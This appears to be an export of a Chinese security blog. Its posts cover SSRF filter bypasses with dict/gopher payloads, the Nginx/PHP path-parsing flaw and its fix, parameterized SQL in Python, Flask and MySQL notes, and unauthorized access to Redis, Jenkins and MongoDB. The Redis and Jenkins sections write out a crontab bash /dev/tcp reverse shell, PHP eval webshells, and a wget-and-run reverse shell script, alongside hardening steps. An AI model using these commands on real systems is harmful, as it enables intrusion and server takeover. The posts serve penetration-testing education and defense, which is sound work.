9、利用句号1127。0。0。1 &gt;&gt;&gt; 127.0.0.1 10、利用进制转换12345可以是十六进制，八进制等。115.239.210.26 &gt;&gt;&gt; 16373751032首先把这四段数字给分别转成16进制，结果：73 ef d2 1a然后把 73efd21a 这十六进制一起转换成8进制记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x 1http://127.0.0.1 &gt;&gt;&gt; http://0177.0.0.1/ 1http://127.0.0.1 &gt;&gt;&gt; http://2130706433/ 12http://192.168.0.1 &gt;&gt;&gt; http://3232235521/http://192.168.1.1 &gt;&gt;&gt; http://3232235777/ 11、利用特殊地址1http://0/ 12、利用协议1234567891011Dict://dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;ssrf.php?url=dict://attacker:11111/SFTP://ssrf.php?url=sftp://example.com:11111/TFTP://ssrf.php?url=tftp://example.com:12346/TESTUDPPACKETLDAP://ssrf.php?url=ldap://localhost:11211/%0astats%0aquitGopher://ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过的组合即可 参考链接：https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRFhttps://twitter.com/albinowax/status/890725759861403648http://blog.safebuff.com/2016/07/03/SSRF-Tips/https://hackerone.com/reports/115748https://www.dailysecurity.fr/server-side-request-forgery/https://twitter.com/EdOverflowhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injectionhttp://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdfhttp://byd.dropsec.xyz/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/http://blog.csdn.net/xinianbuxiu/article/details/53560417]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>CTF</tag>
        <tag>WAF绕过</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx解析漏洞原理分析]]></title>
    <url>%2F2017%2F11%2F09%2FNginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x01 漏洞描述漏洞介绍：nginx是一款高性能的web服务器，使用非常广泛，其不仅经常被用作反向代理，也可以非常好的支持PHP的运行。Nginx&lt;8.03默认情况下可能导致服务器错误的将任何类型的文件以PHP的方式进行解析，这将导致严重的安全问题，使得恶意的攻击者可能攻陷支持php的nginx服务器。 0x02 概念介绍0x21 CGICGI是规定web server传递过来的数据是何种标准格式，简单说就是一个协议。web server(例如nginx)只是内容的分发者。比如： 1234567891) 如果请求/index.html，那么web server会去文件系统中找到这个文件，发送给浏览器，这里分发的是静态数据2) 如果请求的是/index.php，根据配置文件，nginx知道这个不是静态文件，需要去找PHP解析器来处理，那么他会把这个请求简单处理后交给PHP解析器问题的核心在于Nginx需要传哪些数据给PHP解析器呢，例如：1) url2) 查询字符串3) POST数据4) HTTP header... 所以，CGI本质上就是规定要传哪些数据、以什么样的格式传递给后方处理这个请求的协议。 0x22 FastCGIFastCGI顾名思义也是CGI的一个协议，FastCGI只是优化了CGI程序的性能12341) 首先，Fastcgi会先启一个master，解析配置文件，初始化执行环境2) 然后再启动多个worker3) 当请求过来时，master会传递给一个worker，然后立即可以接受下一个请求。这样就避免了重复的劳动，效率提高了4) 而且当worker不够用时，master可以根据配置预先启动几个worker等着，同时如果发现空闲worker太多时，也会停掉一些，这样就提高了性能，也节约了资源 0x23 PHP-CGI/PHP-FastCGIPHP的解释器是PHP-CGI，PHP-CGI只是个CGI程序，他自己本身只能解析请求，返回结果，不会进程管理 0x24 PHP-FPMPHP-FPM是PHP-CGI进程的管理器，用来管理PHP-CGI进程的，PHP-FPM的管理对象是PHP-CGI 0x03 漏洞分析nginx默认以cgi的方式支持php的运行，在配置文件中如下配置: 12345678location ~ .php$ &#123; root html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; include fastcgi_params;&#125; 配置参数说明如下 1234567891011121314151. location对请求进行选择的时候会使用URI环境变量进行选择 1) 其中传递到后端Fastcgi的关键变量SCRIPT_FILENAME由nginx生成的$fastcgi_script_name决定 2) 而通过分析可以看到$fastcgi_script_name是直接由URI环境变量控制的2. 这里就是产生问题的点。而为了较好的支持PATH_INFO的提取，在PHP的配置选项里存在cgi.fix_pathinfo选项，其目的是为了从SCRIPT_FILENAME里取出真正的脚本名 我们来假设一个攻击场景: 1. 假设存在一个URL: http://localhost/test/test.jpg 2. 我们以如下的方式去访问: http://localhost/test/test.jpg/test.php 3. nginx将会得到一个URI: /test.jpg/test.php 4. 经过location指令，该请求将会交给后端的fastcgi处理，nginx为其设置环境变量SCRIPT_FILENAME，内容为: /scripts/test.jpg/test.php 5. 后端的fastcgi在接受到该选项时，会根据fix_pathinfo配置决定是否对SCRIPT_FILENAME进行额外的处理，一般情况下如果不对fix_pathinfo进行设置将影响使用PATH_INFO进行路由选择的应用，所以该选项一般配置开启。php通过该选项之后将查找其中真正的脚本文件名字，查找的方式也是查看文件是否存在，这个时候将分离出SCRIPT_FILENAME和PATH_INFO分别为 1) SCRIPT_FILENAME: /scripts/test.jpg 2) PATH_INFO: test.php 6. 最后，以/scripts/test.jpg作为此次请求需要执行的脚本，而nginx会使用php解析器来处理这个jpg文件，攻击者就可以实现让nginx以php来解析任何类型的文件了 所以，漏洞的本质实际上就是由于fcgi和web server对script路径级参数的理解不同出现的问题，这是典型的因为跨系统语境不同导致对同一个请求的不同解释导致的漏洞，它的攻击面是带有这种漏洞的nginx 0x04: 修复方案 修改php.ini配置 1cgi.fix_pathinfo = 0 nginx配置文件中添加1234567891011if ( $fastcgi_script_name ~ ..*/.*php ) &#123; return 403;&#125;/*考虑到MVC框架、用户自定义站点中有可能出现xxx/xx.php的情况，这个规则应该更加细粒度一点，例如*.jpg/.*php、*.txt/.*php*/另外，nginx可以在不需要重启的情况，hotreload配置文件service nginx reload //or /etc/init.d/nginx reload 参考文章： http://www.80sec.com/nginx-securit.htmlhttp://php.net/manual/zh/ini.core.phphttp://www.cnblogs.com/LittleHann/p/4561462.htmlhttp://php.net/manual/zh/install.fpm.configuration.phphttp://php.net/manual/zh/install.fpm.phphttp://segmentfault.com/q/1010000000256516]]></content>
      <tags>
        <tag>文件上传</tag>
        <tag>解析漏洞</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python安全开发之SQL注入]]></title>
    <url>%2F2017%2F11%2F05%2FPython%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[PHP中使用的预编译在python中同样适用，同样可以用预编译来防止python编码中的SQL注入问题。 错误用法：12sql = &quot;select id,name from user where id = %s and name = %s&quot; % (id, name)cur.execute(sql) 这种用法就是常见的拼接字符串导致sql注入漏洞的产生。 正确用法： 12args = (id, name)cur.execute(&apos;select id,name from user where id = %s and name = %s&apos;, args ) 使用如此参数带入方式，python会自动过滤args中的特殊字符，制止SQL注入的产生。 execute()函数本身就有接受SQL语句变量的参数位，可以通过python自身的函数处理sql注入问题,只要正确的使用（即：使用”逗号”，而不是”百分号”）就可以对传入的值进行正确的转义，从而避免SQL注入的发生。 For Example: 12345678910111213141516import sqlite3con = sqlite3.connect(&quot;:memory:&quot;)cur = con.cursor()cur.execute(&quot;create table people (name, age)&quot;) who = &quot;test&quot;age = 22 # This is the qmark style:cur.execute(&quot;insert into people values (?, ?)&quot;, (who, age)) # And this is the named style:cur.execute(&quot;select * from people where name_last=:who and age=:age&quot;, &#123;&quot;who&quot;: who, &quot;age&quot;: age&#125;) print cur.fetchone() 参考文章：http://xlixli.net/?p=377http://www.cnblogs.com/sevck/p/6733702.htmlhttps://crazyof.me/blog/archives/2224.html]]></content>
      <tags>
        <tag>编程</tag>
        <tag>Python</tag>
        <tag>SQL注入</tag>
        <tag>安全开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python开发笔记]]></title>
    <url>%2F2017%2F10%2F17%2FPython%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[近期学习开发中遇到的一些知识，做的学习笔记，做个小记录，持续更新中… Dataset基于SQLAlchemy的便利工具官方文档 数据集使得数据库中的数据读取和写入数据就像阅读和编写JSON文件一样简单。 dataset对于操作JSON、CSV文件、NoSQL非常好用。 import dataset 连接MySQL数据库： 123456db = dataset.connect(&apos;mysql://username:password@10.10.10.10/ctf?charset=utf8&apos;)用户名:username，密码:password，数据库地址(地址+端口):10.10.10.10，database名: ctf连接SQLite数据库：db = dataset.connect(&apos;sqlite:///ctf.db&apos;)连接PostgreSQL数据库：db = dataset.connect(&apos;postgresql://scott:tiger@localhost:5432/mydatabase&apos;) 一定要注意指定字符编码 12345678table = db[&apos;city&apos;] #（选择city表）user = table(&apos;name&apos;) # 找出表中&apos;name&apos;列属性所有数据res = db.query(&apos;select name from table limit 10&apos;) # 如果不需要查看全部数据的话最好用limit，因为全部数据的载入非常非常耗时间for x in res: print x[&apos;name&apos;] # 选name字段的数据table.insert(dict(name=&apos;John Doe&apos;, age=37))table.insert(dict(name=&apos;Jane Doe&apos;, age=34, gender=&apos;female&apos;))john = table.find_one(name=&apos;John Doe&apos;) 在数据库中查找是否有同时满足多个条件的数据：table.find_one(属性1=属性值1, 属性2=属性值2, ...) 注：find_one速度很慢 插入数据dataset会根据输入自动创建表和字段名 12345table = db[&apos;user&apos;]# 或者table = db.get_table(&apos;user&apos;)table.insert(dict(name=&apos;John Doe&apos;, age=46, country=&apos;China&apos;))table.insert(dict(name=&apos;Jane Doe&apos;, age=37, country=&apos;France&apos;, gender=&apos;female&apos;))# 主键id自动生成 更新数据12table.update(dict(name=&apos;John Doe&apos;, age=47), [&apos;name&apos;])# 第二个参数相当于sql update语句中的where，用来过滤出需要更新的记录 事务操作事务操作可以简单的使用上下文管理器来实现,出现异常，将会回滚 12345678910111213141516with dataset.connect() as tx: tx[&apos;user&apos;].insert(dict(name=&apos;John Doe&apos;, age=46, country=&apos;China&apos;))# 相当于：db = dataset.connect()db.begin()try: db[&apos;user&apos;].insert(dict(name=&apos;John Doe&apos;, age=46, country=&apos;China&apos;)) db.commit()except: db.rollback()# 也可以嵌套使用:db = dataset.connect()with db as tx1: tx1[&apos;user&apos;].insert(dict(name=&apos;John Doe&apos;, age=46, country=&apos;China&apos;)) with db as tx2: tx2[&apos;user&apos;].insert(dict(name=&apos;Jane Doe&apos;, age=37, country=&apos;France&apos;, gender=&apos;female&apos;)) 从表获取数据12345users = db[&apos;user&apos;].all()for user in db[&apos;user&apos;]: # print(user[&apos;age&apos;]) # chinese_users = user.find(country=&apos;China&apos;) john = user.find_one(name=&apos;John Doe&apos;) 获取非重复数据 db[&#39;user&#39;].distinct(&#39;country&#39;) 删除记录1table.delete(place=&apos;Berlin&apos;) 执行SQL语句123result = db.query(&apos;SELECT country, COUNT(*) c FROM user GROUP BY country&apos;)for row in result: print(row[&apos;country&apos;], row[&apos;c&apos;]) 导出数据12result = db[&apos;users&apos;].all()dataset.freeze(result, format=&apos;json&apos;, filename=&apos;users.json&apos;) JSONJSON(JavaScript Object Notation) 是一种轻量级的数据交换格式，非常易于人阅读和编写。 123import jsonjson.dumps 将 Python 对象编码成 JSON 字符串json.loads 将已编码的 JSON 字符串解码为 Python 对象 MySQL数据库：分类表-categories，包括类别web,reversing，crypto(加解密),mic等 题目表-tasks,包括题目id，题目名，flag,分值，文件&amp;地址，题目等级，题目详细描述 flag表-flag,包括题目id,用户id,得分，时间戳 用户表-users，包括用户id,用户名，密码 题目分类表-cat_task,包括题目id,题目类别id flag表中每条数据由于是有题目ID task_id和用户ID user_id来共同确认的，所以采用复合主键：primary key (task_id,user_id) 联合主键和复合主键的区别 python装饰器Decorator通过返回包装对象实现间接调用,以此插入额外逻辑 https://www.zhihu.com/question/26930016 wraps本身也是一个装饰器，它能把原函数的元信息拷贝到装饰器函数中，这使得装饰器函数也有和原函数一样的元信息了 123456789101112131415from functools import wrapsdef logged(func): @wraps(func) def with_logging(*args,**kwargs): print func.__name__ + &quot;was called&quot; return func(*args,**kwargs) return with_logging@loggeddef f(x): &quot;&quot;&quot;does some math&quot;&quot;&quot; return x + x * xprint f.__name__ # prints &apos;f&apos;print f.__doc__ # prints &apos;does some math&apos; web框架采用flaskfrom flask import Flask 引入Flask类，Flask类实现了一个WSGI(Web Server Gateway Interface)应用 app = Flask(__name__) app是Flask的实例，它接收包或者模块的名字作为参数，但一般都是传递__name__ 123@app.route(&apos;/&apos;)def hello_world(): return &apos;Hello World!&apos; 使用app.route装饰器会将URL和执行的视图函数的关系保存到app.url_map属性上。处理URL和视图函数的关系的程序就是路由，这里的视图函数就是hello_world 12if __name__ == &apos;__main__&apos;: app.run(host=&apos;0.0.0.0&apos;,port=9000) 使用这个判断可以保证当其他文件引用这个文件的时候（例如from hello import app）不会执行这个判断内的代码，也就是不会执行app.run函数。 执行app.run就可以启动服务了。默认Flask只监听虚拟机的本地127.0.0.1这个地址，端口为5000。而我们对虚拟机做的端口转发端口是9000，所以需要制定host和port参数，0.0.0.0表示监听所有地址，这样就可以在本机访问了。 服务器启动后，会调用werkzeug.serving.run_simple进入轮询，默认使用单进程单线程的werkzeug.serving.BaseWSGIServer处理请求，实际上还是使用标准库BaseHTTPServer.HTTPServer，通过select.select做0.5秒的while TRUE的事件轮询。当我们访问http://127.0.0.1:9000/,通过app.url_map找到注册的/这个URL模式,就找到了对应的hello_world函数执行，返回hello world!,状态码为200。如果访问一个不存在的路径，如访问http://127.0.0.1:9000/a,Flask找不到对应的模式，就会向浏览器返回Not Found，状态码为404 flask中jsonify的作用jsonify的作用实际上就是将我们传入的json形式数据序列化成为json字符串，作为响应的body，并且设置响应的Content-Type为application/json，构造出响应返回至客户端 效果等于json.dumps jsonify的Content-Type字段值为application/json json.dumps的Content-Type字段值为text/html 修改flask中静态文件夹修改的flask默认的static文件夹只需要在创建Flask实例的时候,把static_folder和static_url_path参数设置为空字符串即可。 app = Flask(__name__, static_folder=&#39;&#39;, static_url_path=&#39;&#39;) 访问的时候用url_for函数，res文件夹和static文件夹同一级： url_for(&#39;static&#39;, filename=&#39;res/favicon.ico&#39;) werkzeugwerkzeug是一个WSGI工具包，可以作为一个Web框架的底层库。它封装好了很多Web框架的东西，例如 Request，Response等等。Flask框架就是一Werkzeug 为基础开发的 generate_password_hash(password)将用户输入的明文密码加密成密文进行存储 密码加盐哈希函数。用来将明文密码加密，返回加密后的密文，用来进行用户注册 函数定义： 12345678werkzeug.security.generate_password_hash(password, method=&apos;pbkdf2:sha1&apos;, salt_length=8)密文格式：method$salt$hashpassword: 明文密码method: 哈希的方式（需要是hashlib库支持的），格式为pbpdf2:&lt;method&gt;[:iterations]。参数说明： method：哈希的方式，一般为SHA1， iterations：（可选参数）迭代次数，默认为1000。slat_length: 盐值的长度，默认为8 check_password_hash(hash,password)验证经过generate_password_hash哈希的密码，将明文和密文进行比较,查看是否一致，用来验证用户登录 函数定义： 123werkzeug.security.check_password_hash(pwhash, password)pwhash: generate_password_hash生成的哈希字符串password: 需要验证的明文密码 flask中的session123from flask import sessionuser = db[&apos;users&apos;].find_one(username=username)session[&apos;user_id&apos;] = user[&apos;id&apos;] 由于使用了session，所以需要设置一个secret_key用来做一些模块的hashFlask Web Development 中的内容: SECRET_KEY配置变量是通用密钥,可在Flask和多个第三方扩展中使用。如其名所示,加密的强度取决于变量值的机密度。不同的程序要使用不同的密钥,而且要保证其他人不知道你所用的字符串。 SECRET_KEY的作用主要是提供一个值做各种HASH, 是在其加密过程中作为算法的一个参数(salt或其他)。所以这个值的复杂度也就影响到了数据传输和存储时的复杂度。 flask 变量规则要给URL添加变量部分，你可以把这些特殊的字段标记为&lt;variable_name&gt;， 这个部分将会作为命名参数传递到你的函数。规则可以用&lt;converter:variable_name&gt;指定一个可选的转换器 123@route(&apos;/hello/&lt;name&gt;&apos;)def index(name): return &apos;&lt;b&gt;Hello &#123;&#123;name&#125;&#125;&lt;/b&gt;!&apos; 数据库查询对dataset的数据查询，使用冒号来为变量传参。 select f.task_id from flags f where f.user_id = :user_id&#39;&#39;&#39;,user_id=session[&#39;user_id&#39;]) 模板渲染使用render_template方法来渲染模板。将模板名和你想作为关键字的参数传入模板的变量 MySQLIFNULL(expr1,expr2) 如果expr1不是NULL，IFNULL()返回expr1，否则它返回expr2。 IFNULL()返回一个数字或字符串值，取决于它被使用的上下文环境。 max函数是用来找出记录集中最大值的记录 121. 对于left join，不管on后面跟什么条件，左表的数据全部查出来，因此要想过滤需把条件放到where后面2. 对于inner join，满足on后面的条件表的数据才能查出，可以起到过滤作用。也可以把条件放到where后面 在使用left jion时，on和where条件的区别如下： 121、 on条件是在生成临时表时使用的条件，它不管on中的条件是否为真，都会返回左边表中的记录。2、where条件是在临时表生成好后，再对临时表进行过滤的条件。这时已经没有left join的含义（必须返回左边表的记录）了，条件不为真的就全部过滤掉。 order by的用法 123456使用order by，一般是用来，依照查询结果的某一列（或多列）属性，进行排序（升序：ASC；降序：DESC；默认为升序）。当排序列含空值时：ASC：排序列为空值的元组最后显示。DESC：排序列为空值的元组最先显示。可以把null值看做无穷大select * from s order by sno desc, sage asc group by的用法 123456789101112131415161718group by按照查询结果集中的某一列（或多列），进行分组，值相等的为一组1、细化集函数（count，sum，avg，max，min）的作用对象：未对查询结果分组，集函数将作用于整个查询结果。对查询结果分组后，集函数将分别作用于每个组。SELECT cno,count(sno) from sc group by cno2、GROUP BY子句的作用对象是查询的中间结果表分组方法：按指定的一列或多列值分组，值相等的为一组。使用GROUP BY子句后，SELECT子句的列名列表中只能出现分组属性（比如：sno）和集函数（比如：count（））select sno,count(cno) from sc group by sno3、多个列属性进行分组select cno,grade,count(cno) from sc group by cno,grade4、使用HAVING短语筛选最终输出结果只有满足HAVING短语指定条件的组才输出。HAVING短语与WHERE子句的区别：作用对象不同。1、WHERE子句作用于基表或视图，从中选择满足条件的元组。2、HAVING短语作用于组，从中选择满足条件的组select sno from sc group by sno having count(cno)&gt;3select sno,count(cno) from sc where grade&gt;60 group by sno having count(cno)&gt;3 MySQL的左连接、右连接、等值连接1.左连接（left join ）123select m.columnname……,n.* columnname…..from left_table m left join right_table n on m.columnname_join=n.columnname_join and n.columnname=xxxwhere m.columnname=xxx….. ON是连接条件，用于把2表中等值的记录连接在一起，但是不影响记录集的数量。若是表left_table中的某记录，无法在表right_table找到对应的记录，则此记录依然显示在记录集中，只是表right_table需要在查询显示的列的值用NULL替代； ON连接条件中表n.columnname=xxx用于控制right_table表是否有符合要求的列值还是用NULL替换的方式显示在查询列中，不影响记录集的数量； WHERE字句控制记录是否符合查询要求，不符合则过滤掉 2.右连接（right join）123select m.columnname……,n.* columnname…..from left_table m right join right_table n on m. columnname_join=n. columnname_join and m. columnname=xxxwhere n.columnname=xxx….. 3.等值连接12345678select m.columnname……,n.* columnname…..from left_table m [inner] join right_table n on m. columnname_join=n. columnname_joinwhere m.columnname=xxx….. and n.columnname=xxx….或者select m.columnname……,n.* columnname…..from left_table m , right_table nwhere m. columnname_join=n. columnname_join andm.columnname=xxx….. and n.columnname=xxx…. ON是连接条件，不再与左连接或右连接的功效一样，除了作为2表记录匹配的条件外，还会起到过滤记录的作用，若left_table中记录无法在right_table中找到对应的记录，则会被过滤掉； WHERE字句，不管是涉及表left_table、表right_table上的限制条件，还是涉及2表连接的条件，都会对记录集起到过滤作用，把不符合要求的记录刷选掉； jinja2获取循环索引1234567jinja2获取循环&#123;% for i in n %&#125;的索引使用loop.index&#123;% for i in names %&#125;&lt;tr&gt; &lt;td&gt;&#123;&#123; loop.index &#125;&#125;&lt;/td&gt; //当前是第x条 &lt;td&gt;&#123;&#123; i.name &#125;&#125;&lt;/td&gt;&lt;/tr&gt;&#123;% endfor %&#125; flask 重定向和错误可以用redirect()函数把用户重定向到其它地方。放弃请求并返回错误代码，用abort()函数。 12345678from flask import abort, redirect, url_for@app.route(&apos;/&apos;)def index(): return redirect(url_for(&apos;login&apos;))@app.route(&apos;/login&apos;)def login(): abort(401) this_is_never_executed() 默认情况下，错误代码会显示一个黑白的错误页面。如果你要定制错误页面，可以使用errorhandler() 装饰器: 1234from flask import render_template@app.errorhandler(404)def page_not_found(error): return render_template(&apos;page_not_found.html&apos;), 404 注意 render_template()调用之后的 404 。这告诉Flask，该页的错误代码是404 ，即没有找到。默认为200，也就是一切正常。 flask CSRF防护机制123456789101112@app.before_requestdef csrf_protect(): if request.method == &quot;POST&quot;: token = session.pop(&apos;_csrf_token&apos;, None) if not token or token != request.form.get(&apos;_csrf_token&apos;): abort(403)def some_random_string(): return hashlib.sha256(os.urandom(16).hexdigest())def generate_csrf_token(): if &apos;_csrf_token&apos; not in session: session[&apos;_csrf_token&apos;] = some_random_string() return session[&apos;_csrf_token&apos;] 在flask的全局变量里面注冊 上面那个生成随机token的函数 app.jinja_env.globals[&#39;csrf_token&#39;] = generate_csrf_token 在网页的模板是这么引入的 12&lt;form method=post action=&quot;&quot;&gt; &lt;input name=_csrf_token type=hidden value=&quot;&#123;&#123; csrf_token() &#125;&#125;&quot;&gt; flask上下文处理器Flask 上下文处理器自动向模板的上下文中插入新变量。上下文处理器在模板渲染之前运行，并且可以在模板上下文中插入新值。上下文处理器是一个返回字典的函数，这个字典的键值最终将传入应用中所有模板的上下文: 123@app.context_processordef inject_user(): return dict(user=g.user) 上面的上下文处理器使得模板可以使用一个名为user值为g.user的变量。不过这个例子不是很有意思，因为g在模板中本来就是可用的，但它解释了上下文处理器是如何工作的。变量不仅限于值，上下文处理器也可以使某个函数在模板中可用（由于Python允许传递函数）: 1234567@app.context_processordef utility_processor(): def format_price(amount, currency=u&apos;€&apos;): return u&apos;&#123;0:.2f&#125;&#123;1&#125;.format(amount, currency) return dict(format_price=format_price)上面的上下文处理器使得format_price函数在所有模板中可用:&#123;&#123; format_price(0.33) &#125;&#125; 日志记录handler = logging.FileHandler(&#39;flask.log&#39;, encoding=&#39;UTF-8&#39;) 1、请求之前设置requestId并记录日志每个URL请求之前，定义requestId并绑定到g 1234@app.before_requestdef before_request(): g.requestId = gen_requestId() logger.info(&quot;Start Once Access, and this requestId is %s&quot; % g.requestId) 2、请求之后添加响应头与记录日志每次返回数据中，带上响应头，包含API版本和本次请求的requestId，以及允许所有域跨域访问API, 记录访问日志 123456789101112131415161718@app.after_requestdef add_header(response): response.headers[&quot;X-SaintIC-Media-Type&quot;] = &quot;saintic.v1&quot; response.headers[&quot;X-SaintIC-Request-Id&quot;] = g.requestId response.headers[&quot;Access-Control-Allow-Origin&quot;] = &quot;*&quot; logger.info(json.dumps(&#123; &quot;AccessLog&quot;: &#123; &quot;status_code&quot;: response.status_code, &quot;method&quot;: request.method, &quot;ip&quot;: request.headers.get(&apos;X-Real-Ip&apos;, request.remote_addr), &quot;url&quot;: request.url, &quot;referer&quot;: request.headers.get(&apos;Referer&apos;), &quot;agent&quot;: request.headers.get(&quot;User-Agent&quot;), &quot;requestId&quot;: str(g.requestId), &#125; &#125; )) return response basicConfig方法可以满足你在绝大多数场景下的使用需求，但是basicConfig有一个很大的缺点。调用basicConfig其实是给root logger添加了一个handler(FileHandler )，这样当你的程序和别的使用了 logging的第三方模块一起工作时，会影响第三方模块的logger行为。这是由logger的继承特性决定的 1234567logging.basicConfig(level=logging.DEBUG, format=&apos;%(asctime)s %(levelname)s %(message)s&apos;, datefmt=&apos;%a, %d %b %Y %H:%M:%S&apos;, filename=&apos;logs/pro.log&apos;, filemode=&apos;w&apos;)logging.debug(&apos;dddddddddd&apos;) MySQL字符编码除了设置数据库的之外，由于dataset默认创建数据库和表的字符集不是utf8,所以需要自己设置，否则会中文乱码，所以需要修改表的字符集 1234567my.cnf[client]default-character-set=utf8[mysqld]character-set-server=utf8collation-server=utf8_general_cidefault-storage-engine=INNODB 表的字符集 show create table tasks; alter table tasks convert to character set utf8;]]></content>
      <tags>
        <tag>编程</tag>
        <tag>Python</tag>
        <tag>MySQL</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[未授权访问漏洞总结]]></title>
    <url>%2F2017%2F09%2F28%2F%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[前言今年5月，比特币勒索病毒WannaCry席卷全球，国内众多机构部门计算机系统瘫痪。根据之前应急响应的案例分析，以及一些安全报告统计，目前大部分的勒索病毒均利用未授权访问等通用漏洞进行植入、勒索，尤其是Redis、MongoDB等数据库的未授权访问漏洞尤其严重。 0x01 介绍未授权访问可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、数据库、网站目录等敏感信息泄露。 目前主要存在未授权访问漏洞的有：NFS服务，Samba服务，LDAP，Rsync，FTP，GitLab，Jenkins，MongoDB，Redis，ZooKeeper，ElasticSearch，Memcache，CouchDB，Docker，Solr，Hadoop，Dubbo等，本文主要介绍一些目前比较常用的一些服务的未授权访问，欢迎大家补充！ 0x02 Redis未授权访问2.1 漏洞描述Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。 2.2 漏洞利用1、利用计划任务执行命令反弹shell在redis以root权限运行时可以写crontab来执行命令反弹shell 先在自己的服务器上监听一个端口 nc -lvnp 4444 然后执行命令:12345redis-cli -h 192.168.2.6set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.1/4444 0&gt;&amp;1\n&quot;config set dir /var/spool/cron/config set dbfilename rootsave 2、写ssh-keygen公钥登录服务器在以下条件下，可以利用此方法 1、Redis服务使用root账号启动2、服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。 此方法具体参考：redis配置不当可直接导致服务器被控制3、获取web服务的webshell当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell。 执行以下命令1234config set dir /var/www/html/config set dbfilename shell.phpset x &quot;&lt;?php @eval($_POST[&apos;caidao&apos;]);?&gt;&quot;save 即可将shell写入web目录 2.3 漏洞加固可以配置redis.conf这个文件，在安装目录下 默认只对本地开放 bind 127.0.0.1 添加登陆密码 requirepass www.secpulse.com 在需要对外开放的时候修改默认端口 port 2333 最后还可以配合iptables限制开放 0x03 Jenkins未授权访问3.1 漏洞描述默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。 3.2 漏洞利用1、Jenkins未授权访问可执行命令http://www.secpulse.com:8080/managehttp://www.secpulse.com:8080/scriptprintln “ifconfig -a”.execute().text 执行一些系统命令直接wget下载back.py反弹shell123println &quot;wget http://xxx.secpulse.com/tools/back.py -P /tmp/&quot;.execute().textprintln &quot;python /tmp/back.py 10.1.1.111 8080&quot;.execute().textback.py并不需要root权限 不想反弹试试Terminal Plugin2、Jenkins未授权访问写shelljenskins是java web项目,我们用java的File类写文件12345new File(&quot;c://temp//secpulse.txt&quot;).write(&quot;&quot;&quot;123&quot;&quot;&quot;); 新建一个内容为1,2,3(每一行)的1.txt到c盘的temp文件夹,运行如下命令println “powershell dir c:\temp”.execute().text如果写成功,那么secpulse.txt就会在返回结果中!wget写webshell12345678910111. println &quot;wget http://shell.secpulse.com/data/t.txt -o /var/www/html/secpulse.php&quot;.execute().text2. new File(&quot;/var/www/html/secpulse.php&quot;).write(&apos;&lt;?php @eval($_POST[s3cpu1se]);?&gt;&apos;);3. def webshell = &apos;&lt;?php @eval($_POST[s3cpu1se]);?&gt;&apos;new File(&quot;/var/www/html/secpulse.php&quot;).write(&quot;$webshell&quot;);4. def execute(cmd) &#123;def proc = cmd.execute()proc.waitFor()&#125;execute( [ &apos;bash&apos;, &apos;-c&apos;, &apos;echo -n &quot;&lt;?php @eval($&quot; &gt; /usr/local/nginx_1119/html/secpulse.php&apos; ] )execute( [ &apos;bash&apos;, &apos;-c&apos;, &apos;echo &quot;_POST[s3cpu1se]);?&gt;&quot; &gt;&gt; /usr/local/nginx_1119/html/secpulse.php&apos; ] )//参数-n 不要在最后自动换行 Result: 0 表示成功写入 Result: 1 表示目录不存在或者权限不足 写入失败 Result: 2 表示构造有异常 写入失败 具体其他详细利用方法参考：知其一不知其二之Jenkins Hacking 3.3 漏洞加固 禁止把Jenkins直接暴露在公网 添加认证，建议使用用户矩阵或者与JIRA打通，JIRA设置密码复杂度 0x04 MongoDB未授权访问4.1 漏洞描述开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,而且可以远程访问数据库，登录的用户可以通过默认端口无需密码对数据库进行增、删、改、查等任意高危操作。 4.2 漏洞利用 4.3 漏洞加固 为MongoDB添加认证： 123451)MongoDB启动时添加--auth参数2)给MongoDB添加用户：use admin 